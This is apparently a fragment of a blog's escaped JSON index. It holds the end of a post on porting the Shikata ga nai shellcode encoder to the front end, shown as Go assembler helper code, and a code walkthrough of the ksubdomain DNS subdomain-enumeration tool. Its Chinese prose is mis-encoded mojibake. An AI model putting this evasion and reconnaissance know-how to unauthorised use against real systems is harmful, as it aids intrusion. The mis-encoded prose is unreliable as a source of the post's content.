style=\"color:#a6e22e\"\u003esgn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e...\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;github.com/EgeBalci/keystone-go\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e...\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// Assemble assembes the given instructions\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// and return a byte array with a boolean value indicating wether the operation is successful or not\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eencoder\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eEncoder\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eAssemble\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003easm\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e) ([]\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003ebool\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emode\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ekeystone\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMode\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eswitch\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eencoder\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003earchitecture\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003emode\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ekeystone\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMODE_32\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003emode\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ekeystone\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMODE_64\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefault\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eks\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ekeystone\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNew\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ekeystone\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eARCH_X86\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003emode\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eks\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eClose\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003eks\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eOption\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ekeystone\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eOPT_SYNTAX\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ekeystone\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eOPT_SYNTAX_INTEL\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e//log.Println(asm)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ebin\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eok\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eks\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eAssemble\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003easm\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebin\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eok\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// GetAssemblySize assembes the given  instructions and returns the total instruction size\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// if assembly fails return value is -1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eencoder\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eEncoder\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eGetAssemblySize\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003easm\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emode\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ekeystone\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMode\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eswitch\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eencoder\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003earchitecture\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003emode\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ekeystone\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMODE_32\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003emode\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ekeystone\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMODE_64\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefault\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eks\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ekeystone\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNew\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ekeystone\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eARCH_X86\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003emode\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eks\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eClose\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003eks\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eOption\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ekeystone\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eOPT_SYNTAX\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ekeystone\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eOPT_SYNTAX_INTEL\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e//log.Println(asm)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ebin\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eok\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eks\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eAssemble\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003easm\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e !\u003cspan style=\"color:#a6e22e\"\u003eok\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e len(\u003cspan style=\"color:#a6e22e\"\u003ebin\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e...\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eå…¶å®å·¥ä½œé‡å¹¶ä¸å¤§ï¼Œåªæ˜¯éœ€è¦æŠŠæ‰€æœ‰å¯¹ keystone-go çš„è°ƒç”¨æ¢åˆ°keystone.jsä¸Šå³å¯ã€‚\u003c/p\u003e","title":"å°†Shikata ga naiå¸¦åˆ°å‰ç«¯"},{"content":"å‰ä¸¤å¤©çœ‹äº†amasså…³äºdnsæšä¸¾çš„å®ç°ï¼Œå½“ç„¶å…³äºåŠ é€Ÿdnsæšä¸¾çš„è¿˜æœ‰ksubdomainè¿™ä¸ªé¡¹ç›®ï¼Œä»Šå¤©èŠ±äº†å‡ åˆ†é’Ÿçœ‹äº†ä¸‹å®ç°\né˜…è¯»åŸºäº https://github.com/boy-hack/ksubdomain/commit/9a2f2967eb8fb5c155b22393b9241f4cd6a02dc4\nåˆ†æ é¦–å…ˆä»å…¥å£ç‚¹å¼€å§‹çœ‹ https://github.com/boy-hack/ksubdomain/blob/main/cmd/ksubdomain/enum.go#L55-L109\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 Action: func(c *cli.Context) error { if c.NumFlags() == 0 { cli.ShowCommandHelpAndExit(c, \u0026#34;enum\u0026#34;, 0) } var domains []string // handle domain if c.String(\u0026#34;domain\u0026#34;) != \u0026#34;\u0026#34; { domains = append(domains, c.String(\u0026#34;domain\u0026#34;)) } if c.String(\u0026#34;domainList\u0026#34;) != \u0026#34;\u0026#34; { dl, err := core.LinesInFile(c.String(\u0026#34;domainList\u0026#34;)) if err != nil { gologger.Fatalf(\u0026#34;è¯»å–domainæ–‡ä»¶å¤±è´¥:%s\\n\u0026#34;, err.Error()) } domains = append(dl, domains...) } levelDict := c.String(\u0026#34;level-dict\u0026#34;) var levelDomains []string if levelDict != \u0026#34;\u0026#34; { dl, err := core.LinesInFile(levelDict) if err != nil { gologger.Fatalf(\u0026#34;è¯»å–domainæ–‡ä»¶å¤±è´¥:%s,è¯·æ£€æŸ¥--level-dictå‚æ•°\\n\u0026#34;, err.Error()) } levelDomains = dl } else if c.Int(\u0026#34;level\u0026#34;) \u0026gt; 2 { levelDomains = core.GetDefaultSubNextData() } opt := \u0026amp;options.Options{ Rate: options.Band2Rate(c.String(\u0026#34;band\u0026#34;)), Domain: domains, FileName: c.String(\u0026#34;filename\u0026#34;), Resolvers: options.GetResolvers(c.String(\u0026#34;resolvers\u0026#34;)), Output: c.String(\u0026#34;output\u0026#34;), Silent: c.Bool(\u0026#34;silent\u0026#34;), Stdin: c.Bool(\u0026#34;stdin\u0026#34;), SkipWildCard: c.Bool(\u0026#34;skip-wild\u0026#34;), TimeOut: c.Int(\u0026#34;timeout\u0026#34;), Retry: c.Int(\u0026#34;retry\u0026#34;), Method: \u0026#34;enum\u0026#34;, OnlyDomain: c.Bool(\u0026#34;only-domain\u0026#34;), NotPrint: c.Bool(\u0026#34;not-print\u0026#34;), Level: c.Int(\u0026#34;level\u0026#34;), LevelDomains: levelDomains, } opt.Check() r, err := runner.New(opt) if err != nil { gologger.Fatalf(\u0026#34;%s\\n\u0026#34;, err.Error()) return nil } r.RunEnumeration() r.Close() return nil }, å…·ä½“çš„å®ç°ç»†èŠ‚å°±ä¸å…³æ³¨äº†ï¼Œå¯ä»¥çœ‹åˆ°å…¥å£ç‚¹åªæ˜¯è¯»å–äº†ä¸€äº›é…ç½®ï¼Œç»§ç»­è¿›å…¥ RunEnumeration çœ‹çœ‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 func (r *runner) RunEnumeration() { ctx, cancel := context.WithCancel(r.ctx) defer cancel() go r.recvChanel(ctx) // å¯åŠ¨æ¥æ”¶çº¿ç¨‹ for i := 0; i \u0026lt; 3; i++ { go r.sendCycle(ctx) // å‘é€çº¿ç¨‹ } go r.handleResult(ctx) // å¤„ç†ç»“æœï¼Œæ‰“å°è¾“å‡º var isLoadOver bool = false // æ˜¯å¦åŠ è½½æ–‡ä»¶å®Œæ¯• t := time.NewTicker(1 * time.Second) defer t.Stop() for { select { case \u0026lt;-t.C: r.PrintStatus() if isLoadOver { if r.hm.Length() == 0 { gologger.Printf(\u0026#34;\\n\u0026#34;) gologger.Infof(\u0026#34;æ‰«æå®Œæ¯•\u0026#34;) return } } case \u0026lt;-r.fisrtloadChanel: go r.retry(ctx) // éå†hmï¼Œä¾æ¬¡é‡è¯• isLoadOver = true } } } é¦–å…ˆæ˜¯å¯åŠ¨äº†ä¸€ä¸ªæ¥æ”¶dns respæ•°æ®åŒ…çš„åç¨‹ï¼Œç„¶åå¯åŠ¨äº†ä¸‰ä¸ªå‘é€dns reqæ•°æ®åŒ…çš„åç¨‹ï¼Œè¿˜æœ‰ä¸€ä¸ªçº¿ç¨‹ handleResult ç”¨æ¥è¾“å‡ºç»“æœ\nå‰©ä¸‹çš„æˆ‘ä»¬å…ˆä¸å…³æ³¨ï¼Œå¯ä»¥æ€è€ƒä¸€ä¸‹ï¼Œå¯åŠ¨ä¸€ä¸ªå‘é€åç¨‹ï¼Œä¸€ä¸ªæ¥æ”¶åç¨‹ï¼Œä¸€ä¸ªç”¨æ¥æ‰“å°ç»“æœï¼Œå•çº¯è¿™ä¸‰ä¸ªåç¨‹æˆ‘ä»¬è‚¯å®šæ˜¯æ²¡æ³•æ§åˆ¶æ•´ä¸ªç¨‹åºçš„åœæ­¢çš„ï¼Œå› ä¸ºæ¥æ”¶åç¨‹è‚¯å®šæ˜¯éœ€è¦ä¸€ä¸ªæ­»å¾ªç¯å»è¯»å–ã€‚\næ‰€ä»¥æˆ‘ä»¬çœ‹çœ‹ä¸‹æ¥çš„æ§åˆ¶ï¼ŒisLoadOver æ¯”è¾ƒå…³é”®ï¼Œå¯ä»¥çœ‹åˆ°å®ƒç”± fisrtloadChanel æ¥æ§åˆ¶ï¼Œæˆ‘ä»¬æ‰¾æ‰¾å®ƒæ˜¯åœ¨å“ªé‡Œè¢«èµ‹å€¼çš„\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 type runner struct { ether *device.EtherTable //æœ¬åœ°ç½‘å¡ä¿¡æ¯ hm *statusdb.StatusDb options *options2.Options limit ratelimit.Limiter handle *pcap.Handle successIndex uint64 sendIndex uint64 recvIndex uint64 faildIndex uint64 sender chan string recver chan core.RecvResult freeport int dnsid uint16 // dnsid ç”¨äºæ¥æ”¶çš„ç¡®å®šID maxRetry int // æœ€å¤§é‡è¯•æ¬¡æ•° timeout int64 // è¶…æ—¶xxç§’åé‡è¯• ctx context.Context fisrtloadChanel chan string // æ•°æ®åŠ è½½å®Œæ¯•çš„chanel startTime time.Time domains []string } func New(options *options2.Options) (*runner, error) { var err error version := pcap.Version() r := new(runner) gologger.Infof(version + \u0026#34;\\n\u0026#34;) r.options = options r.ether = GetDeviceConfig() r.hm = statusdb.CreateMemoryDB() gologger.Infof(\u0026#34;DNS:%s\\n\u0026#34;, options.Resolvers) r.handle, err = device.PcapInit(r.ether.Device) if err != nil { return nil, err } // æ ¹æ®å‘åŒ…æ€»æ•°å’Œtimeoutæ—¶é—´æ¥åˆ†é…æ¯ç§’é€Ÿåº¦ allPacket := r.loadTargets() if options.Level \u0026gt; 2 { allPacket = allPacket * int(math.Pow(float64(len(options.LevelDomains)), float64(options.Level-2))) } calcLimit := float64(allPacket/options.TimeOut) * 0.85 if calcLimit \u0026lt; 1000 { calcLimit = 1000 } limit := int(math.Min(calcLimit, float64(options.Rate))) r.limit = ratelimit.New(limit) // per second gologger.Infof(\u0026#34;Rate:%dpps\\n\u0026#34;, limit) r.sender = make(chan string, 99) // å¤šä¸ªåç¨‹å‘é€ r.recver = make(chan core.RecvResult, 99) // å¤šä¸ªåç¨‹æ¥æ”¶ freePort, err := freeport.GetFreePort() if err != nil { return nil, err } r.freeport = freePort gologger.Infof(\u0026#34;FreePort:%d\\n\u0026#34;, freePort) r.dnsid = 0x2021 // set dnsid 65500 r.maxRetry = r.options.Retry r.timeout = int64(r.options.TimeOut) r.ctx = context.Background() r.fisrtloadChanel = make(chan string) r.startTime = time.Now() go func() { for _, msg := range r.domains { r.sender \u0026lt;- msg if options.Method == \u0026#34;enum\u0026#34; \u0026amp;\u0026amp; options.Level \u0026gt; 2 { r.iterDomains(options.Level, msg) } } r.domains = nil r.fisrtloadChanel \u0026lt;- \u0026#34;ok\u0026#34; }() return r, nil } æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒæ˜¯ç”¨æ¥åœ¨æ•°æ®å…¨éƒ¨å‘å¾€ sender åçš„ä¸€ä¸ªæ ‡è¯†ä½ï¼Œå¯ä»¥çœ‹åˆ° New å‡½æ•°æ˜¯ç”¨æ¥åˆå§‹åŒ–é™é€Ÿå™¨ï¼Œtimeoutç­‰ç­‰ã€‚\nç„¶åæˆ‘ä»¬ç»§ç»­å›åˆ°ä¹‹å‰çš„ä»£ç çœ‹çœ‹\n1 2 3 case \u0026lt;-r.fisrtloadChanel: go r.retry(ctx) // éå†hmï¼Œä¾æ¬¡é‡è¯• isLoadOver = true å¯ä»¥çœ‹åˆ°å½“æ•°æ®å…¨éƒ¨å‘å¾€ sender åï¼Œå°†ä¼šè°ƒç”¨retry\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 func (r *runner) retry(ctx context.Context) { for { // å¾ªç¯æ£€æµ‹è¶…æ—¶çš„é˜Ÿåˆ— now := time.Now() r.hm.Scan(func(key string, v statusdb.Item) error { if r.maxRetry \u0026gt; 0 \u0026amp;\u0026amp; v.Retry \u0026gt; r.maxRetry { r.hm.Del(key) atomic.AddUint64(\u0026amp;r.faildIndex, 1) return nil } if int64(now.Sub(v.Time)) \u0026gt;= r.timeout { // é‡æ–°å‘é€ r.sender \u0026lt;- key } return nil }) length := 1000 